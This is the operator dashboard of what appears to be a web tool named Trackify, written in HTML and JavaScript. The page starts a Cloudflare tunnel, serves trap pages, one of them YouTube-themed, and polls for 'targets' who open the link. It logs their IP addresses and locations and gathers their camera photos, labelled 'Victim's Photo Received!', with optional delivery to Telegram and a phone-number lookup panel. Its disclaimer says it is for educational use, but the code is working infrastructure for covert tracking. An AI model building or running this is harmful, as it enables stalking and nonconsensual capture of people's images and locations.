                            <button class="btn btn-secondary" type="button" onclick="performPhoneLookup()">Scan</button>
                        </div>
                        <div id="phoneLookupResults" class="phone-lookup-results" aria-live="polite">
                            <div class="phone-lookup-terminal">
                                <div class="phone-lookup-terminal-line"><span class="hint">[*]</span> Enter a phone number on the left and press <span class="link">Scan</span> to generate OSINT URLs.</div>
                                <div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~# </span><span class="terminal-cursor"></span></div>
                            </div>
                        </div>
                    </div>
                    <div class="phone-history">
                        <div class="phone-history-title">Scan History</div>
                        <div id="phoneHistoryList" class="phone-history-list">
                            <div class="phone-history-item">
                                <div class="phone-history-meta">No scans yet. Run your first lookup to populate history.</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </div>

    <div class="lightbox" id="lightbox" onclick="closeLightbox()" role="dialog" aria-modal="true" aria-label="Full size capture">
        <button type="button" class="lightbox-close" onclick="event.stopPropagation(); closeLightbox();" aria-label="Close">×</button>
        <img id="lightboxImg" src="" alt="Capture full size" onclick="event.stopPropagation()">
    </div>

    <div class="toast" id="toast">Copied to clipboard!</div>

    <div class="modal-overlay" id="disclaimerModal" onclick="closeDisclaimer(event)">
        <div class="modal-content" onclick="event.stopPropagation()">
            <h2 class="modal-title">Disclaimer</h2>
            <div class="modal-body">
                <p>This tool is intended for educational and authorized security testing purposes only.</p>
                <p>Use of this software to track, monitor, or collect information from individuals without their explicit consent may violate privacy laws and regulations in your jurisdiction.</p>
                <p>You are solely responsible for ensuring your use complies with all applicable laws. The developers assume no liability for misuse of this software.</p>
            </div>
            <button class="modal-close" onclick="closeDisclaimer()">I Understand</button>
        </div>
    </div>

    <div class="support-float" aria-live="polite">
        <div class="support-prompt" id="supportPrompt">
            If you want to support this project and help continue development, you can support me on Ko-fi.
            <div class="support-prompt-actions">
                <a class="support-link-btn" href="https://ko-fi.com/0cod3" target="_blank" rel="noopener noreferrer">Support on Ko-fi</a>
                <button type="button" class="support-dismiss-btn" id="supportContinueBtn">Continue</button>
            </div>
        </div>
        <a class="support-fab" href="https://ko-fi.com/0cod3" target="_blank" rel="noopener noreferrer" aria-label="Support this project on Ko-fi">
            ☕ Support on Ko-fi
        </a>
    </div>

    <script>
        const API = 'api.php';

        function escapeHtmlAttr(s) {
            return String(s)
                .replace(/&/g, '&amp;')
                .replace(/"/g, '&quot;')
                .replace(/'/g, '&#39;');
        }

        const terminalEl = document.getElementById('terminal');
        const linkBox = document.getElementById('linkBox');
        const trackerLinkInput = document.getElementById('trackerLink');
        const generateBtn = document.getElementById('generateBtn');
        const statusDisplay = document.getElementById('statusDisplay');
        const statusLink = document.getElementById('statusLink');
        const capturesList = document.getElementById('capturesList');
        let currentPage = 1;

        async function syncPayloadOptions() {
            const formData = new FormData();
            formData.append('template', document.getElementById('template').value);
            formData.append('yt_video_id', document.getElementById('ytVideoId').value || 'dQw4w9WgXcQ');
            try {
                const res = await fetch(API + '?action=update_payload', {
                    method: 'POST',
                    body: formData,
                    credentials: 'same-origin'
                });
                const data = await res.json().catch(() => ({}));
                if (data.status === 'success' && data.regenerated && data.payload_ok === false) {
                    addTerminalLine('[!] Template files not updated — check write permission on trap-*.html / index.php', 'dim');
                }
            } catch (e) {}
        }

        document.getElementById('template').addEventListener('change', function() {
            document.getElementById('ytVideoIdWrap').style.display = this.value === '1' ? 'block' : 'none';
            syncPayloadOptions();
        });

        document.getElementById('ytVideoId').addEventListener('change', function() {
            syncPayloadOptions();
        });

        document.getElementById('useTelegram').addEventListener('change', function() {
            document.getElementById('telegramFields').style.display = this.checked ? 'block' : 'none';
        });

        function addTerminalLine(text, cls = '') {
            const line = document.createElement('div');
            line.className = 'terminal-line' + (cls ? ' ' + cls : '');
            line.textContent = '  ' + text;
            const prompt = terminalEl.querySelector('.terminal-line:last-child');
            if (prompt) {
                terminalEl.insertBefore(line, prompt);
            } else {
                terminalEl.appendChild(line);
            }
            terminalEl.scrollTop = terminalEl.scrollHeight;
        }

        async function generateLink() {
            generateBtn.disabled = true;
            generateBtn.innerHTML = '<span>Starting tunnel...</span>';
            addTerminalLine('[+] Starting Cloudflare tunnel...', 'yellow');
            addTerminalLine('[+] Starting php server... (localhost:8000)', 'yellow');

            const formData = new FormData();
            formData.append('template', document.getElementById('template').value);
            formData.append('yt_video_id', document.getElementById('ytVideoId').value || 'dQw4w9WgXcQ');
            if (document.getElementById('useTelegram').checked) {
                formData.append('telegram', '1');
                formData.append('bot_token', document.getElementById('botToken').value);
                formData.append('chat_id', document.getElementById('chatId').value);
            }

            try {
                const startRes = await fetch(API + '?action=start', {
                    method: 'POST',
                    body: formData,
                    credentials: 'same-origin'
                });
                const startData = await startRes.json().catch(() => ({}));
                if (startData.status === 'error') {
                    addTerminalLine('[!] ' + (startData.message || 'Start failed'), 'dim');
                    generateBtn.disabled = false;
                    generateBtn.innerHTML = '<span>Generate Link</span>';
                    return;
                }
            } catch (e) {
                addTerminalLine('[!] Error: ' + e.message, 'dim');
                generateBtn.disabled = false;
                generateBtn.innerHTML = '<span>Generate Link</span>';
                return;
            }

            addTerminalLine('[+] Waiting for Cloudflare tunnel link...', 'yellow');
            pollForLink();
        }

        async function pollForLink() {
            let lastExcerpt = '';
            for (let i = 0; i < 90; i++) {
                await new Promise(r => setTimeout(r, 1000));
                const res = await fetch(API + '?action=link', { credentials: 'same-origin' });
                const data = await res.json();
                if (data.tunnel_log_excerpt) {
                    lastExcerpt = data.tunnel_log_excerpt;
                }
                if (data.status === 'forbidden' || data.status === 'error') {
                    addTerminalLine('[!] ' + (data.message || 'Could not claim tunnel for your account'), 'dim');
                    generateBtn.disabled = false;
                    generateBtn.innerHTML = '<span>Generate Link</span>';
                    return;
                }
                if (data.link) {
                    if (data.payload_ok === false) {
                        addTerminalLine('[!] Tunnel is up but trap-*.html was not written — fix permissions on the project root', 'dim');
                    } else if (data.template_id != null) {
                        addTerminalLine('[+] Template #' + data.template_id + ' → /' + (data.trap_file || 'trap-?.html') + ' (if wrong page: hard refresh or private window)', 'dim');
                    }
                    linkBox.style.display = 'flex';
                    trackerLinkInput.value = data.link;
                    addTerminalLine('', 'green');
                    addTerminalLine('[+] Tracker Link: ' + data.link, 'green');
                    addTerminalLine('', 'green');
                    addTerminalLine('[*] Waiting for targets, Press Ctrl + C to exit...', 'yellow');
                    statusDisplay.innerHTML = '<span class="status-badge active">Tunnel active</span>';
                    statusLink.textContent = data.link;
                    document.getElementById('stopBtn').style.display = 'inline-flex';
                    document.getElementById('stopBtnSidebar').style.display = 'block';
                    generateBtn.disabled = false;
                    generateBtn.innerHTML = '<span>Generate Link</span>';
                    loadPhotos(1);
                    loadCaptures();
                    return;
                }
            }
            addTerminalLine('[!] Timeout: Could not get tunnel link (waited 90s).', 'dim');
            if (lastExcerpt) {
                addTerminalLine('[!] cloudflared log: ' + lastExcerpt, 'dim');
            } else {
                addTerminalLine('[!] Install cloudflared, confirm tunnel_origin in config.php reaches your PHP server, and that this machine can reach Cloudflare.', 'dim');
            }
            generateBtn.disabled = false;
            generateBtn.innerHTML = '<span>Generate Link</span>';
        }

        async function stopService() {
            const stopBtn = document.getElementById('stopBtn');
            const stopBtnSidebar = document.getElementById('stopBtnSidebar');
            stopBtn.disabled = true;
            stopBtnSidebar.disabled = true;
            try {
                const res = await fetch(API + '?action=stop', { credentials: 'same-origin' });
                const data = await res.json();
                if (data.status === 'success') {
                    addTerminalLine('', 'dim');
                    addTerminalLine('[+] Tunnel stopped.', 'dim');
                    linkBox.style.display = 'none';
                    trackerLinkInput.value = '';
                    statusDisplay.innerHTML = '<span class="status-badge inactive">Tunnel inactive</span>';
                    statusLink.textContent = '';
                    stopBtn.style.display = 'none';
                    stopBtnSidebar.style.display = 'none';
                    const toast = document.getElementById('toast');
                    toast.textContent = 'Tunnel stopped';
                    toast.style.background = 'var(--accent-yellow)';
                    toast.classList.add('show');
                    setTimeout(() => { toast.classList.remove('show'); toast.style.background = ''; }, 2000);
                }
            } catch (e) {
                addTerminalLine('[!] Error stopping: ' + e.message, 'dim');
            }
            stopBtn.disabled = false;
            stopBtnSidebar.disabled = false;
        }

        function copyViaInputField(input) {
            const wasReadOnly = input.readOnly;
            try {
                input.readOnly = false;
                input.focus();
                input.select();
                input.setSelectionRange(0, input.value.length);
                const ok = document.execCommand('copy');
                input.readOnly = wasReadOnly;
                return ok;
            } catch (e) {
                try {
                    input.readOnly = wasReadOnly;
                } catch (e2) {}
                return false;
            }
        }

        function copyViaHiddenTextarea(text) {
            const ta = document.createElement('textarea');
            ta.value = text;
            ta.setAttribute('readonly', '');
            ta.style.cssText = 'position:fixed;left:-9999px;top:0;opacity:0';
            document.body.appendChild(ta);
            ta.focus();
            ta.select();
            ta.setSelectionRange(0, text.length);
            let ok = false;
            try {
                ok = document.execCommand('copy');
            } catch (e) {}
            document.body.removeChild(ta);
            return ok;
        }

        function showCopyResult(ok) {
            const toast = document.getElementById('toast');
            toast.textContent = ok
                ? 'Copied to clipboard!'
                : 'Could not copy automatically. Select the link in the box and press Ctrl+C (Cmd+C on Mac).';
            toast.style.background = ok ? '' : 'var(--accent-red)';
            toast.classList.add('show');
            setTimeout(function () {
                toast.classList.remove('show');
                toast.style.background = '';
            }, ok ? 2000 : 4000);
        }

        function copyLink() {
            const input = trackerLinkInput;
            const link = input && input.value;
            if (!link) return;

            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(link).then(function () {
                    showCopyResult(true);
                }).catch(function () {
                    showCopyResult(copyViaInputField(input) || copyViaHiddenTextarea(link));
                });
                return;
            }
            showCopyResult(copyViaInputField(input) || copyViaHiddenTextarea(link));
        }

        function switchView(which) {
            const trackifyLayout = document.getElementById('trackifyLayout');
            const phoneLayout = document.getElementById('phoneLayout');
            const navTrackify = document.getElementById('navItemTrackify');
            const navPhone = document.getElementById('navItemPhone');

            if (!trackifyLayout || !phoneLayout || !navTrackify || !navPhone) return;

            if (which === 'phone') {
                trackifyLayout.style.display = 'none';
                phoneLayout.style.display = 'block';
                navTrackify.classList.remove('active');
                navPhone.classList.add('active');
                loadPhoneHistory();
            } else {
                trackifyLayout.style.display = 'grid';
                phoneLayout.style.display = 'none';
                navTrackify.classList.add('active');
                navPhone.classList.remove('active');
            }
        }

        async function loadPhoneHistory() {
            const listEl = document.getElementById('phoneHistoryList');
            if (!listEl) return;
            try {
                const res = await fetch(API + '?action=phone_history', { credentials: 'same-origin' });
                const data = await res.json();
                if (!data || data.status !== 'success' || !Array.isArray(data.history) || data.history.length === 0) {
                    listEl.innerHTML =
                        '<div class="phone-history-item">' +
                        '<div class="phone-history-meta">No scans yet.</div>' +
                        '</div>';
                    return;
                }
                listEl.innerHTML = data.history.map(item => {
                    const num = String(item.phone_number || '');
                    const cnt = typeof item.url_count === 'number' ? item.url_count : (Array.isArray(item.urls) ? item.urls.length : 0);
                    const ts = String(item.created_at || '');
                    const firstUrl = Array.isArray(item.urls) && item.urls.length ? String(item.urls[0]) : '';
                    const safeNum = num.replace(/</g,'&lt;').replace(/>/g,'&gt;');
                    const safeTs = ts.replace(/</g,'&lt;').replace(/>/g,'&gt;');
                    const safeUrl = firstUrl.replace(/</g,'&lt;').replace(/>/g,'&gt;');
                    return '' +
                        '<div class="phone-history-item">' +
                        '<div class="phone-history-number">' + safeNum + '</div>' +
                        '<div class="phone-history-meta">' + cnt + ' URL(s) · ' + safeTs + '</div>' +
                        (safeUrl ? '<div class="phone-history-urls"><a href="' + safeUrl + '" target="_blank" rel="noopener noreferrer">' + safeUrl + '</a></div>' : '') +
                        '</div>';
                }).join('');
            } catch (e) {
                listEl.innerHTML =
                    '<div class="phone-history-item">' +
                    '<div class="phone-history-meta">Could not load history.</div>' +
                    '</div>';
            }
        }

        function performPhoneLookup() {
            const input = document.getElementById('phoneLookupInput');
            const resultsEl = document.getElementById('phoneLookupResults');
            if (!input || !resultsEl) return;

            const raw = (input.value || '').trim();
            if (!raw) {
                resultsEl.innerHTML = '<span class="phone-lookup-hint">Enter a phone number to generate search links.</span>';
                return;
            }

            // Normalize a bit but keep the exact string for quoted searches
            const phoneForQuery = raw.replace(/\s+/g, ' ').trim();
            const safeDisplay = phoneForQuery.replace(/</g, '&lt;').replace(/>/g, '&gt;');

            resultsEl.innerHTML =
                '<div class="phone-lookup-terminal">' +
                '<div class="phone-lookup-terminal-line"><span class="hint">[*]</span> Searching for <span class="link">' + safeDisplay + '</span> ...</div>' +
                '<div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~# </span><span class="terminal-cursor"></span></div>' +
                '</div>';

            fetch(API + '?action=phone_lookup&number=' + encodeURIComponent(phoneForQuery), {
                credentials: 'same-origin'
            }).then(r => r.json()).then(data => {
                const lines = [];
                if (!data || data.status !== 'success') {
                    const msg = (data && data.message) ? String(data.message) : 'Search failed';
                    lines.push('<div class="phone-lookup-terminal-line"><span class="hint">[!]</span> ' + msg.replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</div>');
                    lines.push('<div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~# </span><span class="terminal-cursor"></span></div>');
                    resultsEl.innerHTML =
                        '<div class="phone-lookup-terminal">' +
                        lines.join('') +
                        '</div>';
                    return;
                }

                const urls = Array.isArray(data.urls) ? data.urls : [];
                lines.push('<div class="phone-lookup-terminal-line"><span class="hint">[*]</span> Found ' + urls.length + ' result(s) for <span class="link">' + safeDisplay + '</span></div>');
                lines.push('<div class="phone-lookup-terminal-line"><span class="hint">[*]</span> Copy any URL below and open it in your browser.</div>');
                lines.push('<div class="phone-lookup-terminal-line">&nbsp;</div>');

                if (urls.length > 0) {
                    urls.forEach(url => {
                        const rawUrl = String(url);
                        const safeUrl = rawUrl.replace(/</g,'&lt;').replace(/>/g,'&gt;');
                        lines.push(
                            '<div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~#</span> ' +
                            '<a class="link" href="' + safeUrl + '" target="_blank" rel="noopener noreferrer">' +
                            safeUrl +
                            '</a></div>'
                        );
                    });
                }
                lines.push('<div class="phone-lookup-terminal-line">&nbsp;</div>');
                lines.push('<div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~# </span><span class="terminal-cursor"></span></div>');

                resultsEl.innerHTML =
                    '<div class="phone-lookup-terminal">' +
                    lines.join('') +
                    '</div>';
            }).catch(err => {
                const msg = (err && err.message) ? err.message : String(err);
                resultsEl.innerHTML =
                    '<div class="phone-lookup-terminal">' +
                    '<div class="phone-lookup-terminal-line"><span class="hint">[!]</span> Error: ' + msg.replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</div>' +
                    '<div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~# </span><span class="terminal-cursor"></span></div>' +
                    '</div>';
            });
        }

        function syncGallerySelectAll() {
            const grid = document.getElementById('galleryGrid');
            const selectAll = document.getElementById('gallerySelectAll');
            if (!grid || !selectAll) return;
            const cbs = grid.querySelectorAll('.gallery-select-cb');
            if (cbs.length === 0) {
                selectAll.checked = false;
                selectAll.indeterminate = false;
                return;
            }
            const n = [...cbs].filter(c => c.checked).length;
            selectAll.checked = n === cbs.length;
            selectAll.indeterminate = n > 0 && n < cbs.length;
        }

        function updateGalleryBulkDeleteBtn() {
            const grid = document.getElementById('galleryGrid');
            const btn = document.getElementById('galleryBulkDelete');
            if (!grid || !btn) return;
            const n = grid.querySelectorAll('.gallery-select-cb:checked').length;
            btn.disabled = n === 0;
        }

        function resetGallerySelectionUi() {
            const selectAll = document.getElementById('gallerySelectAll');
            if (selectAll) {
                selectAll.checked = false;
                selectAll.indeterminate = false;
            }
            updateGalleryBulkDeleteBtn();
        }

        async function deletePhotosByPaths(paths) {
            if (!paths || !paths.length) return;
            try {
                const res = await fetch(API + '?action=delete_photos', {
                    method: 'POST',
                    credentials: 'same-origin',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ paths })
                });
                const data = await res.json().catch(() => ({}));
                if (data.status !== 'success') {
                    alert(data.message || 'Delete failed');
                    return;
                }
                const toast = document.getElementById('toast');
                let msg = data.deleted ? 'Deleted ' + data.deleted + ' file(s)' : 'Nothing deleted';
                if (data.failed) msg += ' (' + data.failed + ' failed)';
                toast.textContent = msg;
                toast.classList.add('show');
                setTimeout(() => toast.classList.remove('show'), 2500);
                await loadPhotos(currentPage);
            } catch (err) {
                alert('Delete failed: ' + (err && err.message ? err.message : String(err)));
            }
        }

        async function loadPhotos(page = 1) {
            try {
                const res = await fetch(API + '?action=photos&page=' + page + '&per_page=12', { credentials: 'same-origin' });
                const data = await res.json();
                if (data.status === 'success') {
                    currentPage = page;
                    const { photos, pagination } = data;
                    const grid = document.getElementById('galleryGrid');
                    const paginationEl = document.getElementById('pagination');
                    const photoCount = document.getElementById('photoCount');
                    const prevBtn = document.getElementById('prevBtn');
                    const nextBtn = document.getElementById('nextBtn');
                    const paginationInfo = document.getElementById('paginationInfo');
                    const toolbar = document.getElementById('galleryToolbar');

                    if (photos.length === 0 && pagination.total > 0 && pagination.has_prev) {
                        await loadPhotos(page - 1);
                        return;
                    }

                    photoCount.textContent = pagination.total ? pagination.total + ' capture' + (pagination.total !== 1 ? 's' : '') : '';

                    const quotaBanner = document.getElementById('captureQuotaBanner');
                    const q = data.capture_quota;
                    if (quotaBanner && q) {
                        if (q.full) {
                            quotaBanner.style.display = 'block';
                            quotaBanner.textContent = 'Maximum image captures reached (' + q.used + '/' + q.max + '). Delete photos below to allow new camera uploads.';
                        } else {
                            quotaBanner.style.display = 'none';
                        }
                    }

                    if (toolbar) {
                        toolbar.style.display = pagination.total > 0 ? 'flex' : 'none';
                    }
                    resetGallerySelectionUi();

                    if (photos.length === 0) {
                        grid.innerHTML = `
                            <div class="gallery-empty" id="galleryEmpty">
                                <div class="gallery-empty-icon">📷</div>
                                <div class="gallery-empty-title">No captures yet</div>
                                <div class="gallery-empty-text">Camera captures will appear here when targets complete verification.</div>
                                <div class="gallery-empty-hint">Generate a link and share it to start capturing</div>
                            </div>
                        `;
                        paginationEl.style.display = 'none';
                    } else {
                        grid.innerHTML = photos.map(p => `
                            <div class="gallery-item" tabindex="0" title="Click to view full size"
                                 data-full-src="${escapeHtmlAttr(p.path)}"
                                 aria-label="Capture ${escapeHtmlAttr(p.filename || '')}">
                                <div class="gallery-item-actions">
                                    <label class="gallery-toolbar-label gallery-select-label">
                                        <input type="checkbox" class="gallery-select-cb" data-path="${escapeHtmlAttr(p.path)}">
                                    </label>
                                    <button type="button" class="gallery-delete-one" data-path="${escapeHtmlAttr(p.path)}" title="Delete" aria-label="Delete capture">×</button>
                                </div>
                                <img src="${p.path}" alt="" loading="lazy">
                                <div class="gallery-item-overlay">${new Date(p.date * 1000).toLocaleString()} · View</div>
                            </div>
                        `).join('');
                        paginationEl.style.display = 'flex';
                        prevBtn.disabled = !pagination.has_prev;
                        nextBtn.disabled = !pagination.has_next;
                        paginationInfo.textContent = `Page ${pagination.page} of ${pagination.total_pages}`;
                        syncGallerySelectAll();
                        updateGalleryBulkDeleteBtn();
                    }
                }
            } catch (e) {}
        }

        function openLightbox(src) {
            if (!src) return;
            const resolved = new URL(src, window.location.href).href;
            const img = document.getElementById('lightboxImg');
            img.src = resolved;
            document.getElementById('lightbox').classList.add('show');
            document.body.style.overflow = 'hidden';
        }

        function closeLightbox() {
            document.getElementById('lightbox').classList.remove('show');
            document.getElementById('lightboxImg').src = '';
            document.body.style.overflow = '';
        }

        (function initGalleryLightbox() {
            const grid = document.getElementById('galleryGrid');
            if (!grid) return;
            grid.addEventListener('click', function (e) {
                if (e.target.closest('.gallery-item-actions')) return;
                const item = e.target.closest('.gallery-item');
                if (!item || !grid.contains(item)) return;
                const src = item.getAttribute('data-full-src');
                if (src) openLightbox(src);
            });
            grid.addEventListener('keydown', function (e) {
                if (e.key !== 'Enter' && e.key !== ' ') return;
                if (e.target.closest('.gallery-item-actions')) return;
                const item = e.target.closest('.gallery-item');
                if (!item || !grid.contains(item)) return;
                e.preventDefault();
                const src = item.getAttribute('data-full-src');
                if (src) openLightbox(src);
            });
            grid.addEventListener('change', function (e) {
                if (!e.target.classList || !e.target.classList.contains('gallery-select-cb')) return;
                syncGallerySelectAll();
                updateGalleryBulkDeleteBtn();
            });
        })();

        (function initGalleryBulkControls() {
            const selectAll = document.getElementById('gallerySelectAll');
            const bulkDel = document.getElementById('galleryBulkDelete');
            const grid = document.getElementById('galleryGrid');
            if (!selectAll || !bulkDel || !grid) return;
            selectAll.addEventListener('change', function () {
                grid.querySelectorAll('.gallery-select-cb').forEach(function (cb) {
                    cb.checked = selectAll.checked;
                });
                selectAll.indeterminate = false;
                updateGalleryBulkDeleteBtn();
            });
            bulkDel.addEventListener('click', function () {
                const paths = [...grid.querySelectorAll('.gallery-select-cb:checked')]
                    .map(function (cb) { return cb.getAttribute('data-path'); })
                    .filter(Boolean);
                if (!paths.length) return;
                if (!confirm('Delete ' + paths.length + ' capture(s)?')) return;
                deletePhotosByPaths(paths);
            });
            grid.addEventListener('click', function (e) {
                const btn = e.target.closest('.gallery-delete-one');
                if (!btn || !grid.contains(btn)) return;
                e.stopPropagation();
                e.preventDefault();
                const path = btn.getAttribute('data-path');
                if (!path) return;
                if (!confirm('Delete this capture?')) return;
                deletePhotosByPaths([path]);
            });
        })();

        document.addEventListener('keydown', function (e) {
            if (e.key === 'Escape' && document.getElementById('lightbox').classList.contains('show')) {
                closeLightbox();
            }
        });

        function openDisclaimer() {
            document.getElementById('disclaimerModal').classList.add('show');
        }

        function closeDisclaimer(event) {
            if (!event || event.target === event.currentTarget || event.target.classList.contains('modal-close')) {
                document.getElementById('disclaimerModal').classList.remove('show');
            }
        }

        async function clearCaptures() {
            const btn = document.getElementById('clearCapturesBtn');
            if (!btn) return;
            if (!confirm('Clear recent capture history?')) return;

            btn.disabled = true;
            try {
                const res = await fetch(API + '?action=clear_captures', {
                    method: 'POST',
                    credentials: 'same-origin'
                });
                const data = await res.json().catch(() => ({}));
                if (data.status !== 'success') {
                    alert(data.message || 'Could not clear captures');
                    return;
                }
                capturesList.innerHTML = '<div class="empty-state">No captures yet</div>';
                const toast = document.getElementById('toast');
                toast.textContent = 'Capture history cleared';
                toast.classList.add('show');
                setTimeout(() => toast.classList.remove('show'), 2000);
            } catch (e) {
                alert('Could not clear captures: ' + (e && e.message ? e.message : String(e)));
            } finally {
                btn.disabled = false;
            }
        }

        (function initSupportPrompt() {
            const prompt = document.getElementById('supportPrompt');
            const continueBtn = document.getElementById('supportContinueBtn');
            if (!prompt || !continueBtn) return;
            const storageKey = 'trackify_support_prompt_hidden';
            try {
                if (localStorage.getItem(storageKey) === '1') {
                    prompt.hidden = true;
                }
            } catch (e) {}

            continueBtn.addEventListener('click', function () {
                prompt.hidden = true;
                try {
                    localStorage.setItem(storageKey, '1');
                } catch (e) {}
            });
        })();

        async function loadCaptures() {
            try {
                const res = await fetch(API + '?action=captures', { credentials: 'same-origin' });
                const data = await res.json();
                if (data.status === 'success' && data.data) {
                    const geo = data.data.geolocations || [];
                    const fromGeo = geo.map(g => ({
                        ip: g.ip,
                        time: g.timestamp,
                        loc: (g.geo && (g.geo.location || g.geo.city)) || g.location || g.city
                    }));
                    const fromIps = (data.data.ips || []).map(row => ({
                        ip: row.ip || 'N/A',
                        time: row.time || '',
                        loc: ''
                    }));
                    const allRows = [...fromGeo, ...fromIps];
                    allRows.sort((a, b) => new Date(b.time || 0) - new Date(a.time || 0));
                    if (allRows.length === 0) {
                        capturesList.innerHTML = '<div class="empty-state">No captures yet</div>';
                    } else {
                        capturesList.innerHTML = allRows.slice(0, 10).map(c => `
                            <div class="capture-item">
                                <span class="ip">${c.ip || 'N/A'}</span>
                                ${c.loc ? '<br><span style="color:var(--text-muted);font-size:12px">' + String(c.loc).substring(0, 35) + '</span>' : ''}
                                <div class="time">${c.time || ''}</div>
                            </div>
                        `).join('');
                    }
                }
            } catch (e) {}
        }

        async function checkStatus() {
            try {
                const res = await fetch(API + '?action=status', { credentials: 'same-origin' });
                const data = await res.json();
                if (data.link) {
                    statusDisplay.innerHTML = '<span class="status-badge active">Tunnel active</span>';
                    statusLink.textContent = data.link;
                    linkBox.style.display = 'flex';
                    trackerLinkInput.value = data.link;
                    document.getElementById('stopBtn').style.display = 'inline-flex';
                    document.getElementById('stopBtnSidebar').style.display = 'block';
                } else {
                    document.getElementById('stopBtn').style.display = 'none';
                    document.getElementById('stopBtnSidebar').style.display = 'none';
                }
            } catch (e) {}
        }

        let lastTerminalEvents = [];
        async function pollTerminalEvents() {
            try {
                const res = await fetch(API + '?action=terminal', { credentials: 'same-origin' });
                const data = await res.json();
                if (data.events && data.events.length > 0) {
                    for (const ev of data.events) {
                        if (lastTerminalEvents.includes(ev.type + ev.content)) continue;
                        lastTerminalEvents.push(ev.type + ev.content);
                        if (ev.type === 'location') {
                            addTerminalLine('', 'green');
                            addTerminalLine('[+] New Target Opened the Link!', 'green');
                            ev.content.split('\n').forEach(l => l.trim() && addTerminalLine(l, 'cyan'));
                        } else if (ev.type === 'ip') {
                            addTerminalLine('', 'green');
                            addTerminalLine('[+] Target opened the link!', 'green');
                            ev.content.split('\n').forEach(l => l.trim() && addTerminalLine(l, 'cyan'));
                        } else if (ev.type === 'photo') {
                            addTerminalLine('', 'green');
                            addTerminalLine('[+] Victim\'s Photo Received!', 'green');
                        }
                    }
                }
            } catch (e) {}
        }

        (function initUserNav() {
            const nav = document.getElementById('userNav');
            const trigger = document.getElementById('userNavTrigger');
            const menu = document.getElementById('userNavMenu');
            if (!nav || !trigger || !menu) return;

            function closeMenu() {
                trigger.setAttribute('aria-expanded', 'false');
                menu.hidden = true;
            }
            function toggleMenu() {
                const open = trigger.getAttribute('aria-expanded') === 'true';
                if (open) {
                    closeMenu();
                } else {
                    trigger.setAttribute('aria-expanded', 'true');
                    menu.hidden = false;
                }
            }

            trigger.addEventListener('click', function (e) {
                e.stopPropagation();
                toggleMenu();
            });
            nav.addEventListener('click', function (e) {
                e.stopPropagation();
            });
            document.addEventListener('click', function () {
                closeMenu();
            });
            document.addEventListener('keydown', function (e) {
                if (e.key === 'Escape') closeMenu();
            });
        })();

        setInterval(() => { loadPhotos(currentPage); loadCaptures(); }, 5000);
        setInterval(checkStatus, 10000);
        setInterval(pollTerminalEvents, 2000);
        checkStatus();
        loadPhotos(1);
        loadCaptures();
    </script>
</body>
</html>
